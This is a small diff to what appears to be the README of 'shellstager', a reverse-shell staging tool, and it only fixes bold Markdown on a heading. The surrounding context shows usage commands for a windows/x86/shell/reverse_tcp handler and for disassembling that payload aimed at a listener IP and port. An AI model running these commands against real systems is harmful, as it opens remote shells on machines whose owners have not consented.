@@ -55,7 +55,7 @@ $ ~/shellstager/ python shellstager.py handler run --payload windows/x86/shell/r
 
 ```
 
-**Shellcode Disassembly
+**Shellcode Disassembly**
 ```
 $ ~/shellstager/ python shellstager.py payload disasm --name windows/x86/shell/reverse_tcp --host 172.20.96.252 --port 4444 --lines 30
 [*] Showing 30 lines disassembly:
